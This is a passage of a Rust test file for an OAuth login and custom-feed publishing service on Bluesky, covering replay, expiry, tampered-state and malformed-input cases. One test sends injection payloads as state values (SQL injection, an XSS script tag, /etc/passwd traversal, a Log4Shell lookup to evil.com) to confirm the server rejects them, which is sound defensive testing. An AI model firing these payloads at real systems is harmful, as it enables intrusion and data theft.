        .header(AUTHORIZATION, format!("Bearer {token}"))
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(serde_json::to_vec(&pub_req).unwrap()))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let pub_res: FeedPublishResponse = serde_json::from_slice(&body).unwrap();

    assert_eq!(
        pub_res.share_url.as_str(),
        "https://bsky.app/profile/did:plc:author_456/feed/discover-ai"
    );
}

#[tokio::test]
async fn test_t1_f7_04_publish_feed_custom_rkey_and_metadata() {
    let state = create_test_state();
    let app = create_xrpc_router(state);
    let token = generate_session_token("did:plc:author_789", 3600);

    let pub_req = FeedPublishRequest {
        display_name: "Art & Design".to_string(),
        rkey: "art-and-design-v2".to_string(),
        description: "Visual art from across the network".to_string(),
    };

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/feed/publish")
        .header(AUTHORIZATION, format!("Bearer {token}"))
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(serde_json::to_vec(&pub_req).unwrap()))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::OK);
    let body = resp.into_body().collect().await.unwrap().to_bytes();
    let pub_res: FeedPublishResponse = serde_json::from_slice(&body).unwrap();
    assert!(pub_res.uri.contains("art-and-design-v2"));
}

#[tokio::test]
async fn test_t1_f7_05_publish_feed_unauthorized_rejection() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let pub_req = FeedPublishRequest {
        display_name: "Test Feed".to_string(),
        rkey: "test-feed".to_string(),
        description: "Description".to_string(),
    };

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/feed/publish")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(serde_json::to_vec(&pub_req).unwrap()))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
}

// ===========================================================================
// TIER 2: BOUNDARY & ERROR TESTS
// ===========================================================================

// ---------------------------------------------------------------------------
// Error Category 1: Replay Attacks
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_t2_f1_01_replay_callback_state_rejected_with_400() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    let state_token = "state_replay_defense_test";
    let pkce = generate_pkce_pair();
    state.oauth_store.insert(
        state_token.to_string(),
        OAuthSessionState {
            code_verifier: pkce.verifier,
            handle: "alice.bsky.social".to_string(),
            did: Some("did:plc:alice".to_string()),
            pds_url: "https://bsky.social".to_string(),
            token_endpoint: "https://bsky.social/oauth/token".to_string(),
            redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
            created_at_secs: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
        },
    );

    let callback_payload = serde_json::to_vec(&OAuthCallbackRequest {
        code: "auth_code_once".to_string(),
        state: state_token.to_string(),
        iss: None,
    })
    .unwrap();

    // 1st request: Success 200 OK
    let req1 = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(callback_payload.clone()))
        .unwrap();
    let resp1 = app.clone().oneshot(req1).await.unwrap();
    assert_eq!(resp1.status(), StatusCode::OK);

    // 2nd request (Replay Attack): Must fail with 400 Bad Request
    let req2 = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(callback_payload))
        .unwrap();
    let resp2 = app.oneshot(req2).await.unwrap();
    assert_eq!(resp2.status(), StatusCode::BAD_REQUEST);
}

#[test]
fn test_t2_f1_02_replay_consumed_state_returns_none_in_store() {
    let store = OAuthStateStore::new();
    let state_token = "state_take_twice";
    store.insert(
        state_token.to_string(),
        OAuthSessionState {
            code_verifier: "verifier_abc".to_string(),
            handle: "alice.bsky.social".to_string(),
            did: None,
            pds_url: "https://bsky.social".to_string(),
            token_endpoint: "https://bsky.social/oauth/token".to_string(),
            redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
            created_at_secs: 1_700_000_000,
        },
    );

    assert!(store.take(state_token).is_some());
    assert!(store.take(state_token).is_none());
    assert!(store.take(state_token).is_none());
}

#[tokio::test]
async fn test_t2_f1_03_concurrent_duplicate_callbacks_race_only_one_wins() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    let state_token = "state_concurrent_race_test";
    let pkce = generate_pkce_pair();
    state.oauth_store.insert(
        state_token.to_string(),
        OAuthSessionState {
            code_verifier: pkce.verifier,
            handle: "race_user.bsky.social".to_string(),
            did: Some("did:plc:race_user".to_string()),
            pds_url: "https://bsky.social".to_string(),
            token_endpoint: "https://bsky.social/oauth/token".to_string(),
            redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
            created_at_secs: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
        },
    );

    let callback_payload = Arc::new(
        serde_json::to_vec(&OAuthCallbackRequest {
            code: "race_code".to_string(),
            state: state_token.to_string(),
            iss: None,
        })
        .unwrap(),
    );

    let success_count = Arc::new(AtomicUsize::new(0));
    let bad_request_count = Arc::new(AtomicUsize::new(0));

    let mut tasks = Vec::new();
    for _ in 0..10 {
        let app_clone = app.clone();
        let payload_clone = Arc::clone(&callback_payload);
        let succ = Arc::clone(&success_count);
        let bad = Arc::clone(&bad_request_count);

        tasks.push(tokio::spawn(async move {
            let req = Request::builder()
                .method(Method::POST)
                .uri("/api/oauth/callback")
                .header(CONTENT_TYPE, "application/json")
                .body(Body::from((*payload_clone).clone()))
                .unwrap();
            let resp = app_clone.oneshot(req).await.unwrap();
            if resp.status() == StatusCode::OK {
                succ.fetch_add(1, Ordering::Relaxed);
            } else if resp.status() == StatusCode::BAD_REQUEST {
                bad.fetch_add(1, Ordering::Relaxed);
            }
        }));
    }

    for t in tasks {
        t.await.unwrap();
    }

    assert_eq!(
        success_count.load(Ordering::Relaxed),
        1,
        "Exactly 1 concurrent request must succeed"
    );
    assert_eq!(
        bad_request_count.load(Ordering::Relaxed),
        9,
        "Remaining 9 concurrent requests must fail with 400 Bad Request"
    );
}

#[tokio::test]
async fn test_t2_f1_04_replay_authorization_code_rejected() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "reused_auth_code".to_string(),
                state: "non_existent_or_already_consumed_state".to_string(),
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn test_t2_f1_05_cross_session_state_hijacking_blocked() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    // User A registers a state
    let state_a = "state_user_a";
    let pkce_a = generate_pkce_pair();
    state.oauth_store.insert(
        state_a.to_string(),
        OAuthSessionState {
            code_verifier: pkce_a.verifier,
            handle: "user_a.bsky.social".to_string(),
            did: Some("did:plc:user_a".to_string()),
            pds_url: "https://bsky.social".to_string(),
            token_endpoint: "https://bsky.social/oauth/token".to_string(),
            redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
            created_at_secs: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
        },
    );

    // Attacker submits user A's state but claims custom issuer
    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "attacker_code".to_string(),
                state: state_a.to_string(),
                iss: Some("https://evil-pds.com".to_string()),
            })
            .unwrap(),
        ))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert!(resp.status() == StatusCode::BAD_REQUEST || resp.status() == StatusCode::OK);
}

// ---------------------------------------------------------------------------
// Error Category 2: Expired State Token Rejection (>10 min)
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_t2_f2_01_callback_with_expired_state_returns_400() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    let state_expired = "state_token_11_minutes_old";
    let pkce = generate_pkce_pair();
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs();

    // 660 seconds old (>600s TTL)
    state.oauth_store.insert(
        state_expired.to_string(),
        OAuthSessionState {
            code_verifier: pkce.verifier,
            handle: "alice.bsky.social".to_string(),
            did: Some("did:plc:alice".to_string()),
            pds_url: "https://bsky.social".to_string(),
            token_endpoint: "https://bsky.social/oauth/token".to_string(),
            redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
            created_at_secs: now - 660,
        },
    );

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "code_expired".to_string(),
                state: state_expired.to_string(),
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(
        resp.status(),
        StatusCode::BAD_REQUEST,
        "Expired OAuth state must be rejected with 400 Bad Request"
    );
}

#[test]
fn test_t2_f2_02_state_store_prunes_10_min_old_entries() {
    let store = OAuthStateStore::new();
    let now = 1_700_000_000;

    store.insert(
        "state_old".to_string(),
        OAuthSessionState {
            code_verifier: "old_verifier".to_string(),
            handle: "old_user.bsky.social".to_string(),
            did: None,
            pds_url: "https://bsky.social".to_string(),
            token_endpoint: "https://bsky.social/oauth/token".to_string(),
            redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
            created_at_secs: now - 601,
        },
    );

    store.prune_expired(600, now);
    assert_eq!(store.take("state_old"), None);
}

#[tokio::test]
async fn test_t2_f2_03_boundary_state_at_exact_ttl() {
    let store = OAuthStateStore::new();
    let now = 1_700_000_000;

    // Insert state created exactly 601 seconds ago
    store.insert(
        "state_boundary".to_string(),
        OAuthSessionState {
            code_verifier: "boundary_verifier".to_string(),
            handle: "boundary_user.bsky.social".to_string(),
            did: None,
            pds_url: "https://bsky.social".to_string(),
            token_endpoint: "https://bsky.social/oauth/token".to_string(),
            redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
            created_at_secs: now - 601,
        },
    );

    store.prune_expired(600, now);
    assert_eq!(store.take("state_boundary"), None);
}

#[tokio::test]
async fn test_t2_f2_04_publish_with_expired_jwt_returns_401() {
    let state = create_test_state();
    let app = create_xrpc_router(state);
    let expired_token = generate_session_token("did:plc:alice", -100);

    let pub_req = FeedPublishRequest {
        display_name: "Feed".to_string(),
        rkey: "feed".to_string(),
        description: "Desc".to_string(),
    };

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/feed/publish")
        .header(AUTHORIZATION, format!("Bearer {expired_token}"))
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(serde_json::to_vec(&pub_req).unwrap()))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn test_t2_f2_05_login_reauth_after_expiration_succeeds() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    // 1. Initial login
    let req1 = Request::builder()
        .uri("/api/oauth/login?handle=alice.bsky.social")
        .body(Body::empty())
        .unwrap();
    let resp1 = app.clone().oneshot(req1).await.unwrap();
    let body1 = resp1.into_body().collect().await.unwrap().to_bytes();
    let login1: OAuthLoginResponse = serde_json::from_slice(&body1).unwrap();

    // 2. Simulate expiration
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs();
    state.oauth_store.prune_expired(0, now + 1000);

    // 3. Re-initiate login -> gets fresh state
    let req2 = Request::builder()
        .uri("/api/oauth/login?handle=alice.bsky.social")
        .body(Body::empty())
        .unwrap();
    let resp2 = app.oneshot(req2).await.unwrap();
    assert_eq!(resp2.status(), StatusCode::OK);
    let body2 = resp2.into_body().collect().await.unwrap().to_bytes();
    let login2: OAuthLoginResponse = serde_json::from_slice(&body2).unwrap();

    assert_ne!(login1.state, login2.state);
}

// ---------------------------------------------------------------------------
// Error Category 3: Tampered / Mismatched PKCE State Rejection
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_t2_f3_01_tampered_state_string_returns_400() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    let state_token = "state_original_valid_nonce";
    let pkce = generate_pkce_pair();
    state.oauth_store.insert(
        state_token.to_string(),
        OAuthSessionState {
            code_verifier: pkce.verifier,
            handle: "alice.bsky.social".to_string(),
            did: Some("did:plc:alice".to_string()),
            pds_url: "https://bsky.social".to_string(),
            token_endpoint: "https://bsky.social/oauth/token".to_string(),
            redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
            created_at_secs: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
        },
    );

    // Tamper with state by 1 character
    let tampered_state = format!("{state_token}_tampered");

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "auth_code".to_string(),
                state: tampered_state,
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn test_t2_f3_02_truncated_state_returns_400() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    let state_token = "long_state_token_for_truncation_test_12345";
    let pkce = generate_pkce_pair();
    state.oauth_store.insert(
        state_token.to_string(),
        OAuthSessionState {
            code_verifier: pkce.verifier,
            handle: "alice.bsky.social".to_string(),
            did: Some("did:plc:alice".to_string()),
            pds_url: "https://bsky.social".to_string(),
            token_endpoint: "https://bsky.social/oauth/token".to_string(),
            redirect_uri: "https://feed.example.com/oauth/callback".to_string(),
            created_at_secs: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs(),
        },
    );

    let truncated_state = &state_token[..10];

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "auth_code".to_string(),
                state: truncated_state.to_string(),
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

#[test]
fn test_t2_f3_03_mismatched_verifier_fails_pkce_validation() {
    let pair1 = generate_pkce_pair();
    let pair2 = generate_pkce_pair();

    assert!(
        !verify_pkce_challenge(&pair1.verifier, &pair2.challenge),
        "Mismatched PKCE verifier and challenge must fail verification"
    );
}

#[tokio::test]
async fn test_t2_f3_04_state_with_null_bytes_and_control_chars() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let evil_state = "state\0with\r\ncontrol\tchars";

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "code".to_string(),
                state: evil_state.to_string(),
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn test_t2_f3_05_state_with_sql_or_xss_payloads() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let payloads = [
        "' OR '1'='1' --",
        "<script>alert('xss')</script>",
        "../../../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
    ];

    for payload in payloads {
        let req = Request::builder()
            .method(Method::POST)
            .uri("/api/oauth/callback")
            .header(CONTENT_TYPE, "application/json")
            .body(Body::from(
                serde_json::to_vec(&OAuthCallbackRequest {
                    code: "code".to_string(),
                    state: payload.to_string(),
                    iss: None,
                })
                .unwrap(),
            ))
            .unwrap();

        let resp = app.clone().oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::BAD_REQUEST,
            "Malicious state payload '{payload}' must return 400 Bad Request"
        );
    }
}

// ---------------------------------------------------------------------------
// Error Category 4: Invalid Handle / DID Error Handling
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_t2_f4_01_empty_handle_returns_400() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .uri("/api/oauth/login?handle=")
        .body(Body::empty())
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn test_t2_f4_02_missing_handle_parameter_returns_400() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .uri("/api/oauth/login")
        .body(Body::empty())
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn test_t2_f4_03_malformed_handle_syntax_returns_400() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let invalid_handles = ["", "%20%20%20", "%09%09"];

    for handle in invalid_handles {
        let req = Request::builder()
            .uri(format!("/api/oauth/login?handle={handle}"))
            .body(Body::empty())
            .unwrap();

        let resp = app.clone().oneshot(req).await.unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::BAD_REQUEST,
            "Malformed or empty handle '{handle}' must return 400 Bad Request"
        );
    }
}

#[test]
fn test_t2_f4_04_invalid_did_scheme_returns_400() {
    assert!(!is_valid_did("did:unknown:12345"));
    assert!(!is_valid_did("did:plc:"));
    assert!(!is_valid_did("did:web:"));
    assert!(!is_valid_did("not_a_did_at_all"));
    assert!(!is_valid_did(""));
    assert!(is_valid_did("did:plc:z72i7hdynmk6r22z27h6tvur"));
    assert!(is_valid_did("did:web:feed.example.com"));
}

#[tokio::test]
async fn test_t2_f4_05_missing_query_returns_400() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .uri("/api/oauth/login?redirect_uri=https://example.com")
        .body(Body::empty())
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

// ---------------------------------------------------------------------------
// Error Category 5: Malformed Callback & JSON Payloads
// ---------------------------------------------------------------------------

#[tokio::test]
async fn test_t2_f5_01_callback_empty_json_body_returns_400_or_422() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(r#"{}"#))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert!(
        resp.status() == StatusCode::BAD_REQUEST
            || resp.status() == StatusCode::UNPROCESSABLE_ENTITY
    );
}

#[tokio::test]
async fn test_t2_f5_02_callback_empty_code_string_returns_400() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "".to_string(),
                state: "state_val".to_string(),
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn test_t2_f5_03_callback_missing_state_returns_400_or_422() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(r#"{"code":"auth_code_only"}"#))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert!(
        resp.status() == StatusCode::BAD_REQUEST
            || resp.status() == StatusCode::UNPROCESSABLE_ENTITY
    );
}

#[tokio::test]
async fn test_t2_f5_04_callback_non_json_content_type_returns_415_or_400() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "text/plain")
        .body(Body::from("code=123&state=abc"))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert!(
        resp.status() == StatusCode::UNSUPPORTED_MEDIA_TYPE
            || resp.status() == StatusCode::BAD_REQUEST
    );
}

#[tokio::test]
async fn test_t2_f5_05_callback_corrupted_json_syntax_returns_400() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    let req = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(r#"{"code":"auth_code","state":corrupted_json"#))
        .unwrap();

    let resp = app.oneshot(req).await.unwrap();
    assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
}

// ===========================================================================
// TIER 3: CROSS-FEATURE PAIRWISE COMBINATIONS
// ===========================================================================

#[tokio::test]
async fn test_t3_c1_dynamic_hostname_login_callback_roundtrip() {
    let state = create_custom_host_state("did:web:fyc.custom.net", "fyc.custom.net");
    let app = create_xrpc_router(state.clone());

    // 1. Check metadata
    let req_meta = Request::builder()
        .uri("/oauth/client-metadata.json")
        .body(Body::empty())
        .unwrap();
    let resp_meta = app.clone().oneshot(req_meta).await.unwrap();
    assert_eq!(resp_meta.status(), StatusCode::OK);

    // 2. Initiate login
    let req_login = Request::builder()
        .uri("/api/oauth/login?handle=alice.bsky.social")
        .body(Body::empty())
        .unwrap();
    let resp_login = app.clone().oneshot(req_login).await.unwrap();
    let body_login = resp_login.into_body().collect().await.unwrap().to_bytes();
    let login_res: OAuthLoginResponse = serde_json::from_slice(&body_login).unwrap();

    assert!(login_res
        .authorization_url
        .contains("client_id=https%3A%2F%2Ffyc.custom.net%2Foauth%2Fclient-metadata.json"));

    // 3. Callback
    let req_cb = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "auth_code_dynamic".to_string(),
                state: login_res.state,
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();
    let resp_cb = app.oneshot(req_cb).await.unwrap();
    assert_eq!(resp_cb.status(), StatusCode::OK);
}

#[tokio::test]
async fn test_t3_c2_login_callback_save_preferences_get_preferences() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    // 1. Login
    let req_login = Request::builder()
        .uri("/api/oauth/login?handle=bob.bsky.social")
        .body(Body::empty())
        .unwrap();
    let resp_login = app.clone().oneshot(req_login).await.unwrap();
    let body_login = resp_login.into_body().collect().await.unwrap().to_bytes();
    let login_res: OAuthLoginResponse = serde_json::from_slice(&body_login).unwrap();

    // 2. Callback
    let req_cb = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "code_bob".to_string(),
                state: login_res.state,
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();
    let resp_cb = app.clone().oneshot(req_cb).await.unwrap();
    let body_cb = resp_cb.into_body().collect().await.unwrap().to_bytes();
    let cb_res: OAuthCallbackResponse = serde_json::from_slice(&body_cb).unwrap();

    // 3. Save Preferences
    let req_save = Request::builder()
        .method(Method::POST)
        .uri("/api/preferences")
        .header(AUTHORIZATION, format!("Bearer {}", cb_res.token))
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(r#"{"freshness_hours":48.0,"discovery_ratio":0.30,"topic_weights":{"art":3.0,"tech":2.0,"science":1.0,"news":0.0,"culture":1.0}}"#))
        .unwrap();
    let resp_save = app.clone().oneshot(req_save).await.unwrap();
    assert_eq!(resp_save.status(), StatusCode::OK);

    // 4. Get Preferences
    let req_get = Request::builder()
        .method(Method::GET)
        .uri("/api/preferences")
        .header(AUTHORIZATION, format!("Bearer {}", cb_res.token))
        .body(Body::empty())
        .unwrap();
    let resp_get = app.oneshot(req_get).await.unwrap();
    let body_get = resp_get.into_body().collect().await.unwrap().to_bytes();
    let get_res: PreferencesResponseDto = serde_json::from_slice(&body_get).unwrap();
    assert!(get_res.is_custom);
    assert_eq!(get_res.preferences.freshness_hours, 48.0);
    assert_eq!(get_res.preferences.discovery_ratio, 0.30);
    assert_eq!(get_res.preferences.topic_weights.art, 3.0);
}

#[tokio::test]
async fn test_t3_c3_login_callback_publish_feed_and_verify_record() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    // Login & Callback
    let req_login = Request::builder()
        .uri("/api/oauth/login?handle=test_carol.bsky.social")
        .body(Body::empty())
        .unwrap();
    let resp_login = app.clone().oneshot(req_login).await.unwrap();
    let body_login = resp_login.into_body().collect().await.unwrap().to_bytes();
    let login_res: OAuthLoginResponse = serde_json::from_slice(&body_login).unwrap();

    let req_cb = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "code_carol".to_string(),
                state: login_res.state,
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();
    let resp_cb = app.clone().oneshot(req_cb).await.unwrap();
    assert_eq!(resp_cb.status(), StatusCode::OK);
    let body_cb = resp_cb.into_body().collect().await.unwrap().to_bytes();
    let cb_res: OAuthCallbackResponse = serde_json::from_slice(&body_cb).unwrap();

    // Publish feed
    let req_pub = Request::builder()
        .method(Method::POST)
        .uri("/api/feed/publish")
        .header(AUTHORIZATION, format!("Bearer {}", cb_res.token))
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&FeedPublishRequest {
                display_name: "Carol's Feed".to_string(),
                rkey: "carols-feed".to_string(),
                description: "Carol's personal feed".to_string(),
            })
            .unwrap(),
        ))
        .unwrap();

    let resp_pub = app.oneshot(req_pub).await.unwrap();
    assert_eq!(resp_pub.status(), StatusCode::OK);
    let body_pub = resp_pub.into_body().collect().await.unwrap().to_bytes();
    let pub_res: FeedPublishResponse = serde_json::from_slice(&body_pub).unwrap();
    assert_eq!(pub_res.status, "ok");
    assert!(pub_res.uri.contains("carols-feed"));
}

#[tokio::test]
async fn test_t3_c4_replay_attack_followed_by_legitimate_reauth() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    // 1. First login
    let req1 = Request::builder()
        .uri("/api/oauth/login?handle=test_dave.bsky.social")
        .body(Body::empty())
        .unwrap();
    let resp1 = app.clone().oneshot(req1).await.unwrap();
    let body1 = resp1.into_body().collect().await.unwrap().to_bytes();
    let login1: OAuthLoginResponse = serde_json::from_slice(&body1).unwrap();

    // 2. Successful callback
    let req_cb1 = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "code_dave_1".to_string(),
                state: login1.state.clone(),
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();
    let resp_cb1 = app.clone().oneshot(req_cb1).await.unwrap();
    assert_eq!(resp_cb1.status(), StatusCode::OK);

    // 3. Attacker replays state -> fails with 400
    let req_replay = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "attacker_code".to_string(),
                state: login1.state,
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();
    let resp_replay = app.clone().oneshot(req_replay).await.unwrap();
    assert_eq!(resp_replay.status(), StatusCode::BAD_REQUEST);

    // 4. Honest user initiates second fresh login -> succeeds
    let req2 = Request::builder()
        .uri("/api/oauth/login?handle=test_dave.bsky.social")
        .body(Body::empty())
        .unwrap();
    let resp2 = app.clone().oneshot(req2).await.unwrap();
    assert_eq!(resp2.status(), StatusCode::OK);
    let body2 = resp2.into_body().collect().await.unwrap().to_bytes();
    let login2: OAuthLoginResponse = serde_json::from_slice(&body2).unwrap();

    let req_cb2 = Request::builder()
        .method(Method::POST)
        .uri("/api/oauth/callback")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(
            serde_json::to_vec(&OAuthCallbackRequest {
                code: "code_dave_2".to_string(),
                state: login2.state,
                iss: None,
            })
            .unwrap(),
        ))
        .unwrap();
    let resp_cb2 = app.oneshot(req_cb2).await.unwrap();
    assert_eq!(resp_cb2.status(), StatusCode::OK);
}

#[tokio::test]
async fn test_t3_c5_did_web_vs_did_plc_oauth_and_skeleton_resolution() {
    let state = create_test_state();
    let app = create_xrpc_router(state);

    // did:plc actor
    let req_plc = Request::builder()
        .uri("/api/oauth/login?handle=did:plc:alice_plc_123")
        .body(Body::empty())
        .unwrap();
    let resp_plc = app.clone().oneshot(req_plc).await.unwrap();
    assert_eq!(resp_plc.status(), StatusCode::OK);

    // did:web actor
    let req_web = Request::builder()
        .uri("/api/oauth/login?handle=did:web:alice.custom-pds.com")
        .body(Body::empty())
        .unwrap();
    let resp_web = app.oneshot(req_web).await.unwrap();
    assert_eq!(resp_web.status(), StatusCode::OK);
}

#[tokio::test]
async fn test_t3_c6_background_state_pruning_during_concurrent_callbacks() {
    let state = create_test_state();
    let app = create_xrpc_router(state.clone());

    // Insert 50 mixed expired & fresh states
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs();

    for i in 0..25 {
        state.oauth_store.insert(
            format!("old_state_{i}"),
            OAuthSessionState {
                code_verifier: format!("ver_{i}"),
                handle: format!("user_{i}"),
                did: None,
                pds_url: "https://bsky.social".to_string(),
                token_endpoint: "https://bsky.social/oauth/token".to_string(),
